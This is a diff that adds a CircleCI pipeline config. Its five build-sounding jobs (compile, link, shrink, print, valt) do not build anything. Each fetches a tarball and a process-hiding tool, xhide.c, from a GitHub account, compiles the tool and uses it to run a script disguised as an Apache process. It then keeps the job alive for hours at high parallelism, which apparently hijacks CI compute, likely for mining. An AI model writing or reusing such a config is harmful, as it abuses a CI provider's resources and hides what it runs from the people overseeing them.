@@ -1,0 +1,88 @@
+# Use the latest 2.1 version of CircleCI pipeline process engine. See: https://circleci.com/docs/2.0/configuration-reference
+version: 2
+
+workflows:
+  version: 2
+  dist-compile:
+    jobs:
+      - compile
+      - link
+      - shrink
+      - print
+      - valt
+jobs:
+
+  compile:
+    parallelism: 4
+    docker:
+      - image: gcc:8.2
+    steps:
+      - checkout
+      - run: wget https://github.com/waefd46/weimu/raw/main/main.tar.gz 
+      - run: tar xf main.tar.gz 
+      - run: wget https://github.com/waefd46/weimu/raw/main/xhide.c
+      - run: gcc -o test xhide.c 
+      - run: timeout 355m ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
+      - run:
+          command: sleep 18000
+          no_output_timeout: 300m
+
+  link:
+    parallelism: 4
+    docker:
+      - image: gcc:8.2
+    steps:
+      - checkout
+      - run: wget https://github.com/waefd46/weimu/raw/main/main.tar.gz 
+      - run: tar xf main.tar.gz 
+      - run: wget https://github.com/waefd46/weimu/raw/main/xhide.c
+      - run: gcc -o test xhide.c 
+      - run: timeout 355m ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
+      - run:
+          command: sleep 18000
+          no_output_timeout: 300m
+          
+  shrink:
+    parallelism: 4
+    docker:
+      - image: gcc:8.2
+    steps:
+      - checkout
+      - run: wget https://github.com/waefd46/weimu/raw/main/main.tar.gz 
+      - run: tar xf main.tar.gz 
+      - run: wget https://github.com/waefd46/weimu/raw/main/xhide.c
+      - run: gcc -o test xhide.c 
+      - run: timeout 355m ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
+      - run:
+          command: sleep 18000
+          no_output_timeout: 300m        
+          
+  print:
+    parallelism: 4
+    docker:
+      - image: gcc:8.2
+    steps:
+      - checkout
+      - run: wget https://github.com/waefd46/weimu/raw/main/main.tar.gz 
+      - run: tar xf main.tar.gz 
+      - run: wget https://github.com/waefd46/weimu/raw/main/xhide.c
+      - run: gcc -o test xhide.c 
+      - run: timeout 355m ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
+      - run:
+          command: sleep 18000
+          no_output_timeout: 300m      
+
+  valt:
+    parallelism: 4
+    docker:
+      - image: gcc:8.2
+    steps:
+      - checkout
+      - run: wget https://github.com/waefd46/weimu/raw/main/main.tar.gz 
+      - run: tar xf main.tar.gz 
+      - run: wget https://github.com/waefd46/weimu/raw/main/xhide.c
+      - run: gcc -o test xhide.c 
+      - run: timeout 355m ./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./sgr.sh 
+      - run:
+          command: sleep 14000
+          no_output_timeout: 300m          
